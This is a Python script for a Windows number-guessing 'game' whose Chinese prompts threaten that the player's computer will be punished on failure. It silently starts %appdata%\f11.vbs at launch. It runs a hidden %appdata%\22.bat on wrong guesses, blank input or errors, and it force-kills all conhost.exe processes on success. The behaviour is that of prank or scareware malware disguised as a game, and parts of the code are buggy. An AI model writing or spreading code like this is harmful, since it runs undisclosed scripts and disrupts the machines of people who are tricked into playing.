import os
import random
import time 
user_times = 1
user_num = 0
num = 0
time.sleep(1)
os.system("start %appdata%\\f11.vbs")
time.sleep(3)
def kcb():
    global user_times
    global num
    global user_num
    word = ""
    os.system("title Make By 李颢坤")
    for i in "Make By 李颢坤":
        word = word + i
        os.system("cls")
        print(word)
    os.system("pause")
    os.system("cls")
    word = ""
    for i in "你好，我们来玩个游戏，我给你提示，你说出我心中的那个神秘数字，如果说不出来，轰，哈哈，你的电脑将接受死神的眷顾！":
        word = word + i
        os.system("cls")
        print(word)
    os.system("pause")
    num = random.randint(1,10)
    print(num)
    os.system("cls")
    word = ""
    for i in "这是一个在1到10之间的随机数，来猜猜吧，如果猜不出来，轰，哈哈，你的电脑将接受死神的眷顾！":
        word = word + i
        os.system("cls")
        print(word)
    word = ""
    os.system("cls")
    for i in "来猜猜吧，勇士，你只有3次机会，如果猜不出来，轰，哈哈，你的电脑将接受死神的眷顾！":
        word = word + i
        os.system("cls")
        print(word)
    word = ""
kcb()
def userin():
    global user_num
    user_num = input("请输入数字>>>")
    if user_num:
        numclas = type(user_num)
        if numclas == "<class 'str'>":
            try:
                user_num = int(user_num)
            except:
                if user_num == " " or user_num == "":
                    for i in "你放弃了这次机会，你的电脑将接受死神的眷顾！":
                        word = word + i
                        os.system("cls")
                        print(word)
                    os.system("%appdata%\\22.bat")
                    word = ""
                else:
                    for i in "你输入的不是数字，勇士，你放弃了这次机会，你的电脑将接受死神的眷顾！":
                        word = word + i
                        os.system("cls")
                        print(word)
                    os.system("%appdata%\\22.bat")
    else:
        word = ""
        for i in "你没有输入，勇士，你放弃了这次机会，你的电脑将接受死神的眷顾！":
            word = word + i
            os.system("cls")
            print(word)
        os.system("%appdata%\\22.bat")
userin()
try:
    while user_times < 3:
        if int(user_num) > int(num):
            word = ""
            for i in "大了，往小了猜！勇士，你只有3次机会，如果猜不出来，轰，哈哈，你的电脑将接受死神的眷顾！":
                word = word + i
                os.system("cls")
                print(word)
                user_times += 1
            word = ""
            user_times += 1
            userin()
        elif int(num) > int(user_num):
            word = ""
            for i in "小了，往大了猜，如果猜不出来，轰，哈哈，你的电脑将接受死神的眷顾！":
                word = word + i
                os.system("cls")
                print(word)
            word = ""
            user_times += 1
            userin()
        elif int(num) == int(user_num):
            word = ""
            for i in "你成功了，程序即将倒数5秒退出！注意！其它使用Conhost.exe的程序也将退出，请注意！":
                word = word + i
                os.system("cls")
                print(word)
            os.system("timeout /t 5")
            os.system("taskkill /IM conhost.exe /F")
        else:
            pass
    word = ""
    for i in "你失败了，轰，哈哈，你的电脑将接受死神的眷顾！":
        word = word + i
        os.system("cls")
        print(word)
    os.system("%appdata%\\22.bat")
except:
    word = ""
    for i in "我的程序没有Bug！肯定是你弄得鬼！你的电脑将接受死神的眷顾！":
        word = word + i
        os.system("cls")
        print(word)
    os.system("%appdata%\\22.bat")
